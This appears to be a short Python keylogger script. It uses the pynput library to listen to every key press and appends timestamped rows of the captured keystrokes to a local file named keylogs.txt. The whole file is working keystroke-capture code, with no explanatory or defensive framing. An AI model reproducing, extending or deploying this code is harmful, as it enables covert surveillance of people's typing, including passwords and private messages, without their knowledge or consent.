from typing import NamedTuple
import pynput.keyboard as Keyboard
from datetime import datetime

import string

row = ""


def on_press(key):
    global row

    if str(key)[1:-1] in string.printable:
        row += str(key)[1:-1]
    else:
        if str(key) == "Key.shift":
            return
        if str(key) == "Key.space":
            row += ""
            # return

        row += f"          [{str(key)}]"
        with open("keylogs.txt", "a") as file:
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            file.write(current_time+f" Pressed: {row}\n")
            row = ""


def listen():
    print("started")
    with Keyboard.Listener(on_press=on_press) as listener:
        listener.join()
